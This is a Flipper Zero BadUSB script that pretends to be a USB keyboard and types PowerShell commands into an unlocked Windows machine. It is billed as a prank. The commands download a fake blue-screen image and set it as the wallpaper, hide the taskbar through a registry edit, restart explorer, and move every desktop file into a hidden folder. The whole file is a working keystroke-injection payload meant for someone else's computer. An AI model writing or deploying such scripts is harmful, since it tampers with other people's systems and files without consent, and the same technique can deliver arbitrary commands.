let badusb = require("badusb");

badusb.setup({
    vid: 0xAAAA,
    pid: 0xBBBB,
    mfrName: "Flipper",
    prodName: "Zero",
    layoutPath: "/ext/badusb/assets/layouts/en-US.kl"
});

while (!badusb.isConnected()) {
    delay(500);
}

badusb.press("GUI", "r");
delay(500);
badusb.println("powershell");
delay(500);

// Start typing the payload
// Replace with your image URL
badusb.println("$web = 'https://upload.wikimedia.org/wikipedia/commons/f/f7/Windows_10_%26_11_BSOD_%28new_version%29.png'");  
badusb.println("$path = \"$env:TEMP\\bg.png\"");
badusb.println("Invoke-WebRequest $web -OutFile $path");
badusb.println("Add-Type -TypeDefinition @'\nusing System.Runtime.InteropServices;\npublic class Wallpaper {\n[DllImport(\"user32.dll\", SetLastError = true)]\npublic static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);\n}'@");
badusb.println("[Wallpaper]::SystemParametersInfo(20, 0, $path, 3)");

// Hide taskbar via registry
badusb.println("Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StuckRects3' -Name Settings -Value ([byte[]](Get-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StuckRects3').Settings[0..7] + 0x02 + (Get-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StuckRects3').Settings[9..-1])");
badusb.println("Stop-Process -f -ProcessName explorer");

// Move all desktop files to Prank folder
badusb.println("$desktop = [Environment]::GetFolderPath('Desktop')");
badusb.println("$prank = Join-Path $desktop 'Prank'");
badusb.println("New-Item -Path $prank -ItemType Directory -Force");
badusb.println("Get-ChildItem -Path $desktop -File | ForEach-Object { Move-Item $_.FullName $prank }");

// Optional: hide prank folder
badusb.println("attrib +h $prank");

// Done
badusb.println("Write-Host 'Prank complete.'");

badusb.quit();

